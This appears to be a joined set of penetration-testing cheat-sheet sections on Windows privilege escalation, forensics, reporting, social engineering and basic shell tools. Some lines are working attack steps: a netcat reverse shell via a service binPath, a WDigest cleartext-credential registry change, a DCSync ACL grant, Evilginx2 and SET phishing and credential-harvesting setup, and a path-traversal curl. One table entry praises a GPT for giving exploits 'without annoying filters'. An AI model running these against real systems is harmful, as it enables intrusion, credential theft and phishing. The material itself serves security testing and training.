### Abusing Server Operator Group Membership to get a Reverse Shell

```c
$ sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <LHOST> <LPORT>"
$ sc.exe stop vss
$ sc.exe start vss
```

## WDigest

### Store Cleartext Credentials Cleartext in LSASS

```c
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name "UseLogonCredential" -Value '1'"
```

## Whisker

```c
C:\> .\Whisker.exe add /target:<USERNAME>
```

## Windows-Exploit-Suggester

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Prerequisites

```c
$ python -m pip install xlrd
```

### Update

```c
$ ./windows-exploit-suggester.py --update
```

### Usage

```c
$ ./windows-exploit-suggester.py --database 2020-07-15-mssb.xls --systeminfo sysinfo
```

## winexe

```c
$ winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
$ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

## World Writeable Directories

> https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56

```c
C:\Windows\debug\wia
C:\Windows\Registration\CRMLog
C:\Windows\System32\Com\dmp
C:\Windows\System32\fxstmp
C:\Windows\System32\Microsoft\Crypto\rsa\machinekeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\Tasks
C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\PLA\System
C:\Windows\SysWOW64\Com\dmp
C:\Windows\SysWOW64\fxstmp
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\Tasks\microsoft\Windows\PLA\System
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
```

## writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

### Usage

```c
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
PS C:\> Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```







# Forensics

- [Resources](#resources)

## Table of Contents

- [Android](#android)
- [bc](#bc)
- [binwalk](#binwalk)
- [capa](#capa)
- [dd](#dd)
- [emlAnalyzer](#emlanalyzer)
- [exiftool](#exiftool)
- [file](#file)
- [FOREMOST](#foremost)
- [git-dumper](#git-dumper)
- [Git](#git)
- [HEX](#hex)
- [iOS](#ios)
- [Jamovi](#jamovi)
- [ltrace](#ltrace)
- [memdump](#memdump)
- [Microsoft Windows](#microsoft-windows)
- [oletools](#oletools)
- [pngcheck](#pngcheck)
- [steg_brute](#steg_brute)
- [Steghide](#steghide)
- [Sysinternals](#sysinternals)
- [usbrip](#usbrip)
- [Volatility](#volatility)
- [xxd](#xxd)
- [zsteg](#zsteg)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BinDiff | Quickly find differences and similarities in disassembled code | https://github.com/google/bindiff |
| CAPA | The FLARE team's open-source tool to identify capabilities in executable files. | https://github.com/mandiant/capa |
| FLOSS | FLARE Obfuscated String Solver - Automatically extract obfuscated strings from malware. | https://github.com/mandiant/flare-floss |
| FOREMOST | Foremost is a console program to recover files based on their headers, footers, and internal data structures. | https://github.com/korczis/foremost |
| kbd-audio | Acoustic keyboard eavesdropping | https://github.com/ggerganov/kbd-audio |
| oletools | python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging. | https://github.com/decalage2/oletools |
| Process Hacker | A free, powerful, multi-purpose tool that helps you monitor system resources, debug software and detect malware. | https://process-hacker.com |
| Process Monitor | Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity. | https://learn.microsoft.com/en-us/sysinternals/downloads/procmon |
| Regshot | Regshot is a small, free and open-source registry compare utility that allows you to quickly take a snapshot of your registry and then compare it with a second one - done after doing system changes or installing a new software product | https://github.com/Seabreg/Regshot |
| scdbg | Visual Studio 2008 port of the libemu library that includes scdbg.exe, a modification of the sctest project, that includes more hooks, interactive debugging, reporting features, and ability to work with file format exploit shellcode. Will run under WINE | https://github.com/dzzie/VS_LIBEMU |
| Steghide | Execute a brute force attack with Steghide to file with hide information and password established. | https://github.com/Va5c0/Steghide-Brute-Force-Tool |
| Sysinternals Live | live.sysinternals.com - / | https://live.sysinternals.com |
| Sysinternals Suite | The Sysinternals Troubleshooting Utilities have been rolled up into a single Suite of tools. | https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite |
| Sysinternals Utilities | Sysinternals Utilities Index | https://docs.microsoft.com/en-us/sysinternals/downloads |
| Volatility | An advanced memory forensics framework | https://github.com/volatilityfoundation/volatility |

## Android

### Extracting Backups

```c
$ ( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 <FILE>.ab ) |  tar xfvz -
```

## bc

```c
$ echo "obase=16; ibase=2; 00000000010...00000000000000" | bc | xxd -p -r
```

## binwalk

> https://github.com/ReFirmLabs/binwalk

```c
$ binwalk <FILE>
$ binwalk -e <FILE>
```

## capa

```c
C:\> capa <FILE> -vv
```

## dd

### Remote Disk Dump

```c
$ ssh root@<RHOST> "dd if=/dev/sda1 status=progress" | dd of=sda1.dmp
```

## emlAnalyzer

```c
$ emlAnalyzer -i <FILE>\:.eml --header --html -u --text --extract-all
```

## exiftool

### Changes Time and Date

```c
$ exiftool -AllDates='JJJJ:MM:TT HH:MM:SS' <FILE>.ext
```

### Extracting Thumbnail

```c
$ exiftool -b -ThumbnailImage picture.ext > <FILE>.jpg
```

### File Information

```c
$ exiftool -p '$Filename $ImageSize' <FILE>.jpg
```

### Removes all Metadata

```c
$ exiftool -all= <FILE>.JPG
```

### Camera Serial Number

```c
$ exiftool -SerialNumber <FILE>.ext
```

### Renames all Files along the Time and Date when they were created

```c
$ exiftool -P -'Filename<DateTimeOriginal' -d %Y%m%d_%Hh%Mm%Ss_Handy.%%e folder/*
```

### Extracts all Metadata and write it into a File

```c
$ exiftool -q -r -t -f -S -n -csv -fileName -GPSPosition -Model -FocalLength -ExposureTime -FNumber -ISO -BrightnessValue -LensID "." > <FILE>.csv
```

### Extract Creators from .pdf-Files

```c
$ exiftool *.pdf | grep Creator | awk '{print $3}' | sort -u > users.txt
```

## file

```c
$ file <FILE>
```

## FOREMOST

> https://github.com/korczis/foremost

```c
$ foremost -i <FILE>
```

## git-dumper

> https://github.com/arthaud/git-dumper

```c
$ ./git-dumper.py http://<DOMAIN>/<repo>
```

## Git

```c
$ git log --pretty=oneline
$ git log -p
```

## HEX

```c
$ hexdump -C <FILE> | less
```

### Binary to HEX

#### convert.py

```c
#!/usr/bin/env python3
file=open('blueshadow.txt','r')
val=int(file.read(), 2)
hexfile=open('bluehadowhex','w')
hexfile.write(hex(val))
hexfile.close()
file.close()
```

## iOS

### Reading standard File Format "Mach-O" from iOS Applications

```c
$ sudo apt-get install libplist-utils
$ plistutil -i challenge.plist -o challenge.plist.xml
```

## Jamovi

### Extracting .omv Files

```c
$ unzip <FILE>.omv
```

## ltrace

```c
$ ltrace <BINARY>
```

## memdump

### Bash Script

```c
#!/bin/bash
cat /proc/$1/maps | grep "rw-p" | awk '{print $1}' | ( IFS="-"
    while reade a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
            skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
```

## Microsoft Windows

### Shell Bags

```c
<USER_PROFILE>\NTUSER.DAT
<USER_PROFILE>\AppData\Local\Microsoft\Windows\UsrClass.dat
```

## oletools

> https://github.com/decalage2/oletools

### Installation

```c
$ sudo -H pip install -U oletools[full]
```

### Forensic Chain

```c
$ olevba <FILE>
$ mraptor <FILE>
$ msodde -l debug <FILE>
$ pyxswf <FILE>
$ oleobj -l debug <FILE>
$ rtfobj -l debug <FILE>
$ olebrowse <FILE>
$ olemeta <FILE>
$ oletimes <FILE>
$ oledir <FILE>
$ olemap <FILE>
```

## pngcheck

```c
$ pngcheck -vtp7f <FILE>
```

## scdbg

> http://sandsprite.com/blogs/index.php?uid=7&pid=152

```c
PS C:\> .\scdbg.exe -findsc /f \PATH\TO\FILE\<FILE>.sc
```

## steg_brute

```c
$ python steg_brute.py -b -d /usr/share/wordlists/rockyou.txt -f <FILE>.wav
```

## Steghide

> https://github.com/Va5c0/Steghide-Brute-Force-Tool

```c
$ steghide info <FILE>
$ steghide info <FILE> -p <PASSWORD>
$ steghide extract -sf <FILE>
$ steghide extract -sf <FILE> -p <PASSWORD>
```

## Sysinternals

> https://docs.microsoft.com/en-us/sysinternals/downloads/

> https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite

> https://live.sysinternals.com/

```c
PS C:\> Download-SysInternalsTools C:\SysinternalsSuite
```

## usbrip

> https://github.com/snovvcrash/usbrip

```c
$ sudo usbrip events violations <FILE>.json -f syslog
```

## Volatility

> https://www.volatilityfoundation.org/releases

> https://github.com/volatilityfoundation/volatility

### Common Commands

```c
$ volatility -f <FILE> imageinfo
$ volatility -f <FILE> filescan
$ volatility -f <FILE> psscan
$ volatility -f <FILE> dumpfiles
$ volatility -f <FILE>.vmem <FILE>.info
$ volatility -f <FILE>.vmem <FILE>.pslist
$ volatility -f <FILE>.vmem <FILE>.psscan
$ volatility -f <FILE>.vmem <FILE>.dumpfiles
$ volatility -f <FILE>.vmem <FILE>.dumpfiles --pid <ID>
```

### Examples

```c
$ volatility -f <FILE> --profile=Win7SP1x86 filescan
$ volatility -f <FILE> --profile=Win7SP1x64 filescan | grep <NAME>
$ volatility -f <FILE> --profile=Win7SP1x86 truecryptsummary
$ volatility -f <FILE> --profile=Win7SP1x64 psscan --output=dot --output-file=memdump.dot_
$ volatility -f <FILE> --profile=Win7SP1x64 dumpfiles -Q 0x000000001e8feb70 -D .
$ volatility -f <FILE> --profile=Win7SP1x86 dumpfiles -Q 0x000000000bbc7166 --name file -D . -vvv
```

## xxd

```c
$ xxd <FILE>
```

### Output in HEX

```c
$ cat <FILE> | xxd -p
$ printf <VALUE> | xxd -p
```

### HEX to ASCII

```c
$ cat <FILE> | xxd -p -r
$ curl http://<RHOST/file | xxd -r -p
```

### Convert Output into one Line

```c
$ xxd -p -c 10000 <FILE>
```

### kConvert File

```c
$ xxd -r -p <FILE>.txt <FILE>.gpg    // gpg is just an example
```

### Format String into Decimal

```c
$ echo -n '!AD*G-KaPdSgVkY' | xxd -pu
```

### Cut with xxd

```c
$ xxd -p <FILE> | sed 's/../\\x&/g'
\x23\x21\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x33\x0a\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73
```

### Create ELF File

```c
$ xxd -r -ps <HEX_FILE> <FILE>.bin
```

## zsteg

> https://github.com/zed-0xff/zsteg

```c
$ zsteg -a <FILE>    // runs all the methods on the given file
$ zsteg -E <FILE>    // extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png)
```






# Reporting Tools

- [Resources](#resources)

## Table of Contents

- [Folder Structure on Operations Server](#folder-structure-on-operations-server)
- [Logging](#logging)
- [Markdown](#markdown)
- [Meetings](#meetings)
- [Obsidian](#obsidian)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Atomic Red Team | Atomic Red Team™ is a library of tests mapped to the MITRE ATT&CK® framework. Security teams can use Atomic Red Team to quickly, portably, and reproducibly test their environments. | https://github.com/redcanaryco/atomic-red-team |
| Awesome Markdown | A collection of awesome markdown goodies (libraries, services, editors, tools, cheatsheets, etc.) | https://github.com/mundimark/awesome-markdown |
| Caldera | CALDERA™ is a cyber security platform designed to easily automate adversary emulation, assist manual red-teams, and automate incident response. | https://github.com/mitre/caldera |
| Cervantes | Cervantes is an opensource collaborative platform for pentesters or red teams who want to save time to manage their projects, clients, vulnerabilities and reports in one place. | https://github.com/CervantesSec/cervantes |
| Ghostwriter | Ghostwriter is a Django-based web application designed to be used by an individual or a team of red team operators. | https://github.com/GhostManager/Ghostwriter |
| Obsidian | Obsidian is a powerful knowledge base on top of a local folder of plain text Markdown files. | https://obsidian.md |
| OWASP Threat Dragon | Threat Dragon is a free, open-source, cross-platform threat modeling application including system diagramming and a rule engine to auto-generate threats/mitigations. | https://github.com/mike-goodwin/owasp-threat-dragon-desktop |
| PwnDoc-ng | Pentest Report Generator  | https://github.com/pwndoc-ng/pwndoc-ng |
| SysReptor | Pentest Reporting Easy As Pie | https://github.com/Syslifters/sysreptor |
| VECTR | VECTR is a tool that facilitates tracking of your red and blue team testing activities to measure detection and prevention capabilities across different attack scenarios. | https://github.com/SecurityRiskAdvisors/VECTR |
| WriteHat | A pentest reporting tool written in Python. Free yourself from Microsoft Word. | https://github.com/blacklanternsecurity/writehat |
| XMind | Full-featured mind mapping and brainstorming app. | https://www.xmind.net |

## Folder Structure on Operations Server

```c
assessment_name
├── 0-operations
├── 1-osint
├── 2-recon
├── 3-targets
│   ├── domain_name
│   │   └── exfil
│   └── ip_hostname
│       └── exfil
├── 4-screenshots
│   └── YYYYMMDD_HHMM_IP_description.png
├── 5-payloads
├── 6-loot
├── 7-logs
└── README.md
```

### Examples of Screenshots

- 20220801_1508_10.10.1.106_nmap_tcp445.png
- 20220801_1508_10.10.1.106_smb_enumeration.png
- 20220801_1508_10.10.1.106_smb_password_file.png

## Logging

### Basic Logging and Documentation Handling

* Screenshot everything!
* Note every attempt even it's a failure
* Create and update a report storyboard during the process

For adding `time and date` and the current `IP address`, add the required commands to either the `.bashrc` 
or to the `.zshrc`.

### Bash local IP address

```c
PS1="[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | c
ut -d '/' -f 1`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ "
```

### Bash external IP address

```c
PS1='[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `curl -s ifconfig.co`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ '
```

### ZSH local IP address

```c
PS1="[20%D %T] %B%F{red}$(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH external IP address

```c
PS1="[20%D %T] %B%F{red}$(curl -s ifconfig.co)%f%b %B%F{blue}%1~%f%b $ "
```

### PowerShell

For `PowerShell` paste it into the open terminal.

```c
$IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address; function prompt{ "PS" + " [$(Get-Date)] $IPv4> $(get-location) " }
```

### Linux Logging Examples

#### Logging using tee

```c
command args | tee <FILE>.log
```

#### Append to an existing log file

```c
command args | tee -a <FILE>.log
```

#### All commands logging using script utility

```c
script <FILE>.log
```

#### Single command logging using script utility

```c
script -c 'command args' <FILE>.log
```

### Windows Logging Examples

```c
Get-ChildItem -Path D: -File -System -Recurse | Tee-Object -FilePath "C:\temp\<FILE>.txt" -Append | Out-File C:\temp\<FILE>.txt
```

### Metasploit spool command

```c
msf> spool <file>.log
```

## Markdown

### Basic Formatting

```c
* ```c
* ```bash
* ```python
* `<TEXT>`
```

### Table of Contents

```c
1. [Example](#Example)
2. [Example 2](#Example-2)
3. [ExampleLink](https://github.com/<USERNAME>/<REPOSITORY>/blob/master/<FOLDER>/<FILE>.md)

1. # Example
2. # Example 2 <a name="Example-2"></a>
2. # ExampleLink
```

### Tables

```c
| Example |
| --- |
| Value |
```

```c
| Example | Example 2
| --- | --- |
| Value | Value 2 |
```

### Pictures

```c
<p align="center">
  <img width="300" height="300" src="https://github.com/<USERNAME>/<REPOSITORY>/blob/main/<FOLDER>/<FILE>.png">
</p>
```

## Meetings

### Schedule

| | Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Start | Assessment Kickoff | | Sync | | Weekly Review | | |
| Weekly | Planning | | Sync | | Weekly Review | | |
| Closing | Planning | | Sync | | Closing / Assessment Review | | |

## Obsidian

### Useful plugins

* Admonition
* Advanced Tables
* Better Word Count
* Code Block Enhancer
* Editor Syntax Highlight
* File Explorer Note count
* Git
* Iconize
* Icons






# Social Engineering Tools

- [Resources](#resources)

## Table of Contents

- [Evilginx2](#evilginx2)
- [Gophish](#gophish)
- [Storm Breaker](#storm-breaker)
- [The Social Engineering Toolkit (SET)](#the-social-engineering-toolkit-set)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BlackPhish | Super lightweight with many features and blazing fast speeds. | https://github.com/iinc0gnit0/BlackPhish |
| Evilginx2 Phishlets | Evilginx2 Phishlets version (0.2.3) Only For Testing/Learning Purposes | https://github.com/An0nUD4Y/Evilginx2-Phishlets |
| evilginx2 | Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication | https://github.com/kgretzky/evilginx2 |
| evilgophish | evilginx2 + gophish | https://github.com/fin3ss3g0d/evilgophish |
| EvilnoVNC | Ready to go Phishing Platform | https://github.com/JoelGMSec/EvilnoVNC |
| Gophish | Open-Source Phishing Toolkit | https://github.com/gophish/gophish |
| Nexphisher | Advanced Phishing tool for Linux & Termux | https://github.com/htr-tech/nexphisher |
| SocialFish | Phishing Tool & Information Collector  | https://github.com/UndeadSec/SocialFish |
| SniperPhish | SniperPhish - The Web-Email Spear Phishing Toolkit | https://github.com/GemGeorge/SniperPhish |
| Storm Breaker | Social engineering tool [Access Webcam & Microphone & Location Finder] With {Py,JS,PHP} | https://github.com/ultrasecurity/Storm-Breaker |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. | https://github.com/trustedsec/social-engineer-toolkit |

## Evilginx2

> https://help.evilginx.com/docs/getting-started/building

> https://help.evilginx.com/docs/getting-started/quick-start

> https://help.evilginx.com/docs/guides/phishlets

### Installation

```c
$ sudo apt-get install golang
$ git clone https://github.com/kgretzky/evilginx2.git
$ cd evilginx2
$ make
$ sudo ./build/evilginx -p ./phishlets
```

#### Alternatively with Redirectors

```c
$ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
```

### Basic Commands

```c
: phishlets
: lures
: sessions
```

### Prepare Certificates

```c
$ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
$ sudo update-ca-certificates
```

### Domain Setup

```c
: config domain <DOMAIN>
: config ipv4 <LHOST>
```

### Phishlets

> https://help.evilginx.com/docs/guides/phishlets

> https://github.com/An0nUD4Y/Evilginx2-Phishlets

```c
: phishlets hostname <PHISHLET> <DOMAIN>
: phishlets enable <PHISHLET>
```

### Lures

> https://help.evilginx.com/docs/guides/lures

```c
: lures create <PHISHLET>
: lures get-url <ID>
```

### Session Handling

```c
: sessions
: sessions <ID>
```

## Gophish

> https://github.com/sdcampbell/Internal-Pentest-Playbook

> https://www.ired.team/offensive-security/initial-access/phishing-with-gophish-and-digitalocean

### Port Forwarding

```c
$ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L3333:localhost:3333 -N -f
```

## Storm Breaker

> https://medium.com/@frost1/access-location-camera-microphone-of-any-device-547c5b9907f3

### Installation

```c
$ git clone https://github.com/ultrasecurity/Storm-Breaker.git
$ cd Storm-Breaker
$ sudo bash install.sh
$ sudo python3 -m pip install -r requirements.txt
$ sudo python3 st.py
```

### Start ngrok Agent

```c
$ ngrok http 2525
```

> http://8d0b-92-180-8-97.ngrok-free.app -> http://localhost:2525

| Username | Password |
| --- | --- |
| admin | admin |

Chose a link to send to the target.

> http://8d0b-92-180-8-97.ngrok-free.app/templates/nearyou/index.html

## The Social Engineering Toolkit (SET)

### Credential Harvesting

```c
$ sudo setoolkit
```

Navigate to `Social-Engineering Attacks` > `Website Attack Vectors` > `Credential Harvester Attack` > `Site Cloner` == `1`, `2`, `3`, `2`.

```c
$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
```




# AI

- [Resources](#resources)

## Table of Contents

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Bug Hunter GPT | sw33tLie made a custom GPT that should give you any PoC without annoying filters. | https://chat.openai.com/g/g-y2KnRe0w4-bug-hunter-gpt |
| HackerGPT | Specialized AI assistant for bug bounty hunters. | https://www.hackergpt.co |








# Basics

- [Resources](#resources)

## Table of Contents

- [.NET](#net)
- [7z](#7z)
- [adb (Andoid Debug Bridge)](#adb-andoid-debug-bridge)
- [ar](#ar)
- [ash](#ash)
- [ack](#ack)
- [ASCII](#ascii)
- [awk](#awk)
- [Bash](#bash)
- [Bash POSIX](#bash-posix)
- [cadaver](#cadaver)
- [capsh](#capsh)
- [certutil](#certutil)
- [changelist](#changelist)
- [Chisel](#chisel)
- [chmod](#chmod)
- [gcc](#gcc)
- [Copy Files (Bash only)](#copy-files-bash-only)
- [Core Dump](#core-dump)
- [curl](#curl)
- [dig](#dig)
- [dos2unix](#dos2unix)
- [dpkg](#dpkg)
- [echo](#echo)
- [egrep](#egrep)
- [faketime](#faketime)
- [fg](#fg)
- [file](#file)
- [File Transfer](#file-transfer)
- [find](#find)
- [findmnt](#findmnt)
- [for loop](#for-loop)
- [FTP](#ftp)
- [getent](#getent)
- [getfacl](#getfacl)
- [gin](#gin)
- [Git](#git)
- [glab](#glab)
- [Go](#go)
- [grep](#egrep)
- [grpc](#grpc)
- [host](#host)
- [icacls](#icacls)
- [IPython](#ipython)
- [Java](#java)
- [Kerberos](#kerberos)
- [ldd](#ldd)
- [less](#less)
- [lftp](#lftp)
- [Ligolo-ng](#ligolo-ng)
- [Linux](#linux)
- [Logfiles](#logfiles)
- [Logging](#logging)
- [Microsoft Windows](#microsoft-windows)
- [mkpasswd](#mkpasswd)
- [mp64](#mp64)
- [msg](#msg)
- [Nano](#nano)
- [nc / Ncat / netcat](#nc--ncat--netcat)
- [Network File System (NFS)](#network-file-system-nfs)
- [NetworkManager](#networkmanager)
- [nfsshell](#nfsshell)
- [npx](#npx)
- [nsupdate](#nsupdate)
- [objectdump](#objectdump)
- [OpenBSD](#openbsd)
- [Outlook](#outlook)
- [paste](#paste)
- [Perl](#perl)
- [PHP](#php)
- [pipenv](#pipenv)
- [plink](#plink)
- [PNG](#png)
- [POP3](#pop3)
- [PowerShell](#powershell-1)
- [printf](#printf)
- [proc](#proc)
- [ProFTP](#proftp)
- [ProFTPD](#proftpd)
- [Python2](#python2)
- [Python](#python)
- [Python TOTP](#python-totp)
- [RDP](#rdp)
- [readpst](#readpst)
- [regedit](#regedit)
- [rev](#rev)
- [Reverse SSH](#reverse-ssh)
- [rlwrap](#rlwrap)
- [rpm2cpio](#rpm2cpio)
- [rsh](#rsh)
- [rsync](#rsync)
- [RunAs](#runas)
- [sendemail](#sendemail)
- [seq](#seq)
- [SetUID Bit](#setuid-bit)
- [sftp](#sftp)
- [showmount](#showmount)
- [SIGSEGV](#sigsegv)
- [simpleproxy](#simpleproxy)
- [SMB](#smb)
- [smbcacls](#smbcacls)
- [smbclient](#smbclient)
- [smbget](#smbget)
- [smbmap](#smbmap)
- [smbpasswd](#smbpasswd)
- [socat](#socat)
- [Spaces Cleanup](#spaces-cleanup)
- [squid](#squid)
- [squidclient](#squidclient)
- [SSH](#ssh)
- [stat](#stat)
- [strace](#strace)
- [stty](#stty)
- [strings](#strings)
- [SVN](#svn)
- [swaks](#swaks)
- [systemd](#systemd)
- [tee](#tee)
- [tftp](#tftp)
- [timedatectl](#timedatectl)
- [Time and Date](#time-and-date)
- [Tmux](#tmux)
- [TTL](#ttl)
- [utf8cleaner](#utf8cleaner)
- [VDH](#vdh)
- [vim](#vim)
- [VirtualBox](#virtualbox)
- [virtualenv](#virtualenv)
- [wget](#wget)
- [while loop](#while-loop)
- [Writeable Directories](#writeable-directories)
- [Windows Subsystem for Linux (WSL)](#windows-subsystem-for-linux-wsl)
- [Wine](#wine)
- [X](#x)
- [xfreerdp](#xfreerdp)
- [Zip](#zip)
- [zipgrep](#zipgrep)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
| CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
| MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
| Modlishka | Modlishka. Reverse Proxy. | https://github.com/drk1wi/Modlishka |
| Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
| searchcode | Search 75 billion lines of code from 40 million projects | https://searchcode.com |
| socat | Mirror of the socat source code with pre-built releases for Linux (x64 and x86), Windows (x64 and x86), and MacOS (x64) | https://github.com/3ndG4me/socat |
| Swaks | Swiss Army Knife for SMTP | https://github.com/jetmore/swaks |
| up-http-tool | Simple HTTP listener for security testing | https://github.com/MuirlandOracle/up-http-tool |

## .NET

### List available Versions

```c
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

## 7z

### List Files in Archive and Technical Information

```c
$ 7z l -slt <FILE>
```

### Extract Archive

```c
$ 7z x <FILE>
```

## adb (Andoid Debug Bridge)

```c
$ adb connect <RHOST>:5555
$ adb shell
$ adb devices
$ adb install <file>.apk
```

### Set Proxy

```c
$ adb shell settings put global http_proxy <LHOST>:<LPORT>
```

## ar

### Unpacking .deb Files

```c
$ ar x <FILE>.deb
```

## ash

### Interactive Shell sdterr to sdtout

```c
$ ash -i 2>&1
```

## ack

```c
$ ack -i '<STRING>'    // like password
```

## ASCII

```c
$ man ascii
```

## awk

### Use . as Seperator

```c
$ awk -F. '{print $1}' <FILE>
```

### Field Seperator is ":" and it prints the output from Row 3

```c
$ awk -F':' '{print $3}'
```

### Print Line Number 1 and 42

```c
$ awk 'NR==1 || NR==42'
```

```c
$ awk '{print "http://<LHOST>/documents/" $0;}' ../files.txt | xargs -n 1 -P 16 wget  -q -P /PATH/TO/FOLDER/
```

## Bash

### Execute Privilege

```c
$ bash -p
```

## Bash POSIX

```c
$ sls -b '
> bash -p'
bash-4.3$
```

## cadaver

### Accessing WebDAV

```c
$ cadaver http://<RHOST>/webdav
```

## capsh

```c
$ capsh --print
```

## certutil

### Copy Files

```c
$ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

## changelist

### BSD

```c
$ cat /etc/changelist
```

## Chisel

> https://github.com/jpillora/chisel

### Reverse Pivot

#### Server

```c
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```c
$ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
```

##### With PowerShell Start-Process (saps)

```c
PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
```

#### Forwaord multiple Ports at once

```c
$ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:8003:127.0.0.1:8003
```

### SOCKS5 / Proxychains Configuration

#### Server

```c
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```c
$ ./chisel client <LHOST>:9002 R:socks
```

## chmod

### SUID Bit

```c
$ chmod +s <FILE>
```

## gcc

```c
$ gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
```

### Linux

```c
$ gcc -m32|-m64 -o output source.c
```

### Windows

```c
$ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
```

## Copy Files (Bash only)

### wget Version

Paste directly to the Shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

#### Usage

```c
__wget http://<LHOST>/<FILE>
```

### curl Version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

### Usage

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## Core Dump

### Generate Core Dump

```c
$ kill -BUS <PROCESS_ID>
```

### Extract Core Dump

```c
$ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH/TO/FOLDER/
```

## curl

### Common Commands

```c
$ curl -v http://<DOMAIN>                                                        // verbose output
$ curl -X POST http://<DOMAIN>                                                   // use POST method
$ curl -X PUT http://<DOMAIN>                                                    // use PUT method
$ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
